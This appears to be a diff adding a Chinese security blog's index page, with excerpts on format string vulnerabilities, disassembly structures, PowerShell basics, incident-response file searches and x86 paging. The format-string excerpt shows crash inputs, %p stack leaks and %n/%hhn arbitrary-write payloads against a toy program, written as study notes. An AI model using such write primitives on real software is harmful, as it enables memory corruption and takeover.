@@ -184,6 +184,544 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/03/12/%E9%80%86%E5%90%91/%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/12/%E9%80%86%E5%90%91/%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">格式化漏洞学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-12 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-12T00:00:00+08:00">2024-03-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="1、printf-等函数的基本使用"><a href="#1、printf-等函数的基本使用" class="headerlink" title="1、printf 等函数的基本使用"></a>1、printf 等函数的基本使用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%n&quot;</span>, <span class="string">&quot;01234&quot;</span>, &amp;n);  <span class="comment">// n = 5</span></span><br><span class="line"><span class="comment">// %n 能够将此前打印字符的数量存储到传入的指针变量 n 中。</span></span><br><span class="line"><span class="comment">// %n 转换指示符将 %n 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2、漏洞利用"><a href="#2、漏洞利用" class="headerlink" title="2、漏洞利用"></a>2、漏洞利用</h4><ul>
+<li><h3 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;</span>);</span><br><span class="line"><span class="comment">// 对于每一个 %s，printf() 都要从栈中获取一个数字，把该数字视为一个地址，然后打印出地址指向的内存内容，直到出现一个 NULL 字符。</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><h3 id="查看栈内容"><a href="#查看栈内容" class="headerlink" title="查看栈内容"></a>查看栈内容</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="type">int</span> arg1 = <span class="number">1</span>, arg2 = <span class="number">0x88888888</span>, arg3 = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> arg4[<span class="number">10</span>] = <span class="string">&quot;ABCD&quot;</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, format);</span><br><span class="line">    <span class="built_in">printf</span>(format, arg1, arg2, arg3, arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gdb-peda$ x/10x $esp</span></span><br><span class="line"><span class="comment">//0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff</span></span><br><span class="line"><span class="comment">//0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7</span></span><br><span class="line"><span class="comment">//0xffffd570:     0xf7ffda54      0x00000001</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//Guessed arguments:</span></span><br><span class="line"><span class="comment">//arg[0]: 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)</span></span><br><span class="line"><span class="comment">//arg[1]: 0x1</span></span><br><span class="line"><span class="comment">//arg[2]: 0x88888888</span></span><br><span class="line"><span class="comment">//arg[3]: 0xffffffff</span></span><br><span class="line"><span class="comment">//arg[4]: 0xffffd57a (&quot;ABCD&quot;)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//  0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><h3 id="覆盖栈内容-任意地址覆盖"><a href="#覆盖栈内容-任意地址覆盖" class="headerlink" title="覆盖栈内容-任意地址覆盖"></a>覆盖栈内容-任意地址覆盖</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%0134512640d%n\n&quot;, 1, &amp;i);</span><br><span class="line">//根据d前面的代表输出的最小位数，而i会接收所有的长度，所有i=134512640，也即0x8048000 </span><br><span class="line">//根据测试结果  python print(&quot;AAAA&quot;+&quot;.%p&quot;*20)   AAAA在第13个参数，</span><br><span class="line"></span><br><span class="line">print(&quot;\x38\xd5\xff\xff%08x%08x%012d%13$n&quot;)</span><br><span class="line">// 0xffffd538 会被存储在第13个参数， 0xffffd538是参数2 的地址，%13$n 表示将前面已经输出的字符数量存储到内存地址 13 所对应的变量中，即为0x20写入0xffffd538，实现赋值0x20给arg2.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//%13$n 表示将已经输出的字符数目赋值给第 13 个可变参数（即传递给函数的第 14 个参数，因为第一个参数也算一个）所对应的 int* 类型变量</span><br><span class="line"></span><br><span class="line">逐字节覆盖</span><br><span class="line">printf(&quot;%s %hhn\n&quot;, str, &amp;c);       // 写入单字节</span><br><span class="line">printf(&quot;%s %hn\n&quot;, str, &amp;s);        // 写入双字节</span><br><span class="line">printf(&quot;%s %n\n&quot;, str, &amp;i);         // 写入4字节</span><br><span class="line">printf(&quot;%s %ln\n&quot;, str, &amp;l);        // 写入8字节</span><br><span class="line">printf(&quot;%s %lln\n&quot;, str, &amp;ll);      // 写入16字节</span><br><span class="line"></span><br><span class="line">$ python2 -c &#x27;print(&quot;A%15$hhn&quot;+&quot;\x38\xd5\xff\xff&quot;)&#x27; &gt; text</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x88888801      0xffffffff</span><br><span class="line"></span><br><span class="line">$ python2 -c &#x27;print(&quot;A%15$hnA&quot;+&quot;\x38\xd5\xff\xff&quot;)&#x27; &gt; text</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x88880001      0xffffffff</span><br><span class="line"></span><br><span class="line">$ python2 -c &#x27;print(&quot;A%15$nAA&quot;+&quot;\x38\xd5\xff\xff&quot;)&#x27; &gt; text</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x00000001      0xffffffff</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/03/12/%E9%80%86%E5%90%91/%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/03/11/%E9%80%86%E5%90%91/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%BB%93%E6%9E%84%E8%AF%86%E5%88%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/11/%E9%80%86%E5%90%91/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%BB%93%E6%9E%84%E8%AF%86%E5%88%AB/" class="post-title-link" itemprop="url">反汇编结构识别</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-11 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-11T00:00:00+08:00">2024-03-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>1、if else结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">	if (argc == 0) &#123;</span><br><span class="line">		printf(&quot;argc == 0&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		printf(&quot;argc != 0&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反汇编结构</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240311192951890.png" alt="image-20240311192951890"></p>
+<p>结构： </p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240311193412069.png" alt="image-20240311193412069"></p>
+<p>2、switch</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">int n = 1;</span><br><span class="line">scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line">switch(n) &#123;</span><br><span class="line">case 1:</span><br><span class="line">printf(&quot;n == 1&quot;);</span><br><span class="line">break;</span><br><span class="line">case 3:</span><br><span class="line">printf(&quot;n == 3&quot;);</span><br><span class="line">break;</span><br><span class="line">case 100:</span><br><span class="line">printf(&quot;n == 100&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反汇编结构</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240311194157255.png" alt="image-20240311194157255"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/03/11/%E9%80%86%E5%90%91/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%BB%93%E6%9E%84%E8%AF%86%E5%88%AB/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/03/11/%E7%BC%96%E7%A8%8B/powershell%20%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/11/%E7%BC%96%E7%A8%8B/powershell%20%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">powershell 指令学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-11 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-11T00:00:00+08:00">2024-03-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">编程</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>1、powershell 简介</p>
+<p>Powershell 是运行在windows上实现系统和应用程序管理自动化的命令行脚本环境。</p>
+<p>获取当前执行策略：Get-ExecutionPolicy</p>
+<ul>
+<li>Restricted  默认设置，不允许任何脚本执行</li>
+<li>AllSigned   允许有签名的脚本执行</li>
+<li>RemoteSigned  本地的不需要执行，网络下载的不需要执行</li>
+<li>Unstricted   运行所有的Script执行</li>
+</ul>
+<p>如果要运行自己编写的脚本，需要修改执行策略</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure>
+
+<p>2、基本 操作</p>
+<ul>
+<li><p>字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//定义</span><br><span class="line">$string1 = &quot;13445&quot;</span><br><span class="line">//字符串拼接</span><br><span class="line">$stings2 = &quot;s&quot; + &quot;h&quot;</span><br><span class="line">//子串</span><br><span class="line">$string3 = string.substring(2,2)  第一个参数是起始位置，第二个是长度</span><br><span class="line">//替换</span><br><span class="line">$string4 = string.replace(&quot;1&quot;,&quot;2&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$array = 1,2,3,4,5</span><br><span class="line">$array[1]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>哈希表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$student = @&#123;&quot;name&quot;:&quot;xxx&quot;,&quot;age&quot;:&quot;4&quot;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>循环</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">for</span> 循环</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">10</span>; <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">	xxxx</span><br><span class="line">&#125;</span><br><span class="line">//<span class="keyword">foreach</span> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$array</span>)&#123;<span class="built_in">Write-Host</span> <span class="variable">$i</span>&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>常用的powershell命令</p>
+<p>文件管理：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/03/11/%E7%BC%96%E7%A8%8B/powershell%20%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/03/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">文件注册表查找特定日期文件</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-11 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-11T00:00:00+08:00">2024-03-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index"><span itemprop="name">应急响应</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>一 、查找特定日期的文件</p>
+<p>1、everything dm:日期</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240304221112472.png" alt="image-20240304221112472"></p>
+<p>2、windows 资源管理器 ，直接输入修改日期：日期即可</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240304222337505.png" alt="image-20240304222337505"></p>
+<p>二、注册表修改 </p>
+<p>1、工具 RegistryFinder</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240304222920319.png" alt="image-20240304222920319"></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/03/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%87%E4%BB%B6/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/03/10/%E9%80%86%E5%90%91/%E5%86%85%E5%AD%98%E5%88%86%E9%A1%B5%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/10/%E9%80%86%E5%90%91/%E5%86%85%E5%AD%98%E5%88%86%E9%A1%B5%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">内存分页原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-10T00:00:00+08:00">2024-03-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="1、基本知识"><a href="#1、基本知识" class="headerlink" title="1、基本知识"></a>1、基本知识</h4><ul>
+<li><p>控制寄存器：x86&#x2F;x86_64 CPU中提供了控制寄存器，来决定CPU的操作模式和当前执行任务的属性。其中包括CR0-CR8 9个控制寄存器，其中CR5-CR7保留。跟内存分页相关的主要是CR0、CR2和CR3。</p>
+<ul>
+<li><p>CR0:  包含当前处理器运行的控制标志。如位31（PG位）则决定了是否启用分页机制；位0（PE位）决定了处理器是在实模式还是保护模式下运行。位16（WP位）则是写保护位。</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240310145628195.png" alt="image-20240310145628195"></p>
+</li>
+<li><p>CR2：页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。</p>
+</li>
+<li><p>CR3：页目录基址寄存器，保存页目录表的物理地址，该寄存器的12-31位（高20位）保存页目录的地址，低12位保存主要有两个标志位PCD和PWT，控制处理器内部中的分页缓存。</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/imgimage-20240310150102009.png" alt="image-20240310150102009"></p>
+</li>
+</ul>
+</li>
+<li><p>PDE：页目录表项，每个页目录占1个4KB内存页，每个PDE的长度为32比特位（4字节），因此每个页目录表中最多包含1024个PDE。PS位比较重要， 只存在于页目录表。0表示这是4KB页，指向一个页表。1表示这是4MB大页，直接指向物理页。物理地址计算为 PDE的高10位 + 线性地址的低22位。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特</span><br><span class="line">                     |b a 9 8 7 6 5 4 3 2 1 0| </span><br><span class="line">|--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位</span><br><span class="line">|&lt;-------index------&gt;| AVL |G|P|0|A|P|P|U|R|P| 属性</span><br><span class="line">                             |S|   |C|W|/|/|</span><br><span class="line">                                   |D|T|S|W|</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>PTE：页表表项，一个大小为 1024 个元素的数组，用来保存页索引号。数组中的每个元素的高20 bit 用来保存页索引号，低 12 bit 保存页属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特</span><br><span class="line">                     |b a 9 8 7 6 5 4 3 2 1 0|</span><br><span class="line">|--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位</span><br><span class="line">|&lt;-------index------&gt;| AVL |G|P|D|A|P|P|U|R|P| 属性</span><br><span class="line">                             |A|   |C|W|/|/|</span><br><span class="line">                             |T|   |D|T|S|W|</span><br></pre></td></tr></table></figure>
+
+<p>————————————————</p>
+<p>P：有效位。0 表示当前表项无效。<br>R&#x2F;W: 0 表示只读。1表示可读写。<br>U&#x2F;S: 0 表示只能0、1、2特权级可访问。3 表示只有特权级程序可访问<br>A: 0 表示该页未被访问，1表示已被访问。<br>D: 脏位。0表示该页未写过，1表示该页被写过。<br>PS: 只存在于页目录表。0表示这是4KB页，指向一个页表。1表示这是4MB大页，直接指向物理页。<br>————————————————</p>
+</li>
+</ul>
+<h4 id="2、分页原理"><a href="#2、分页原理" class="headerlink" title="2、分页原理"></a>2、分页原理</h4><p>x86的分页机制分为普通的32位经典分页机制以及开启PAE的分页机制。</p>
+<ul>
+<li>32位经典分页（二级分页机制）：10-10-12</li>
+</ul>
+<p>① 通过CR3寄存器（12-31位）定位到页目录的起始地址，取线性地址的高10位作为索引选取页目录的一个表项，也就是PDE。</p>
+<p>② 判断PDE的PS位，如果为1，代表这个PDE指向一个4MB的大内存页，PDE的高10位便是4MB内存页物理地址的高10位，线性地址的低22位是页内偏移。将二者合并起来便得到了物理地址。如果PS位是0，那么根据PDE中的页表基地址（取PDE的高20位，低12位设为0）定位到页表。</p>
+<p>③ 取线性地址的12位到21位（共10位）作为索引选取页表的一个表项，也就是PTE。</p>
+<p>④ 取出PTE中的内存页基地址（取PTE的高20位，低12位设为0）。</p>
+<p>⑤ 取线性地址的低12位作为页中偏移与上一步的内存页基地址相加便得到物理地址。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/03/10/%E9%80%86%E5%90%91/%E5%86%85%E5%AD%98%E5%88%86%E9%A1%B5%E5%8E%9F%E7%90%86/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/TCPIP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
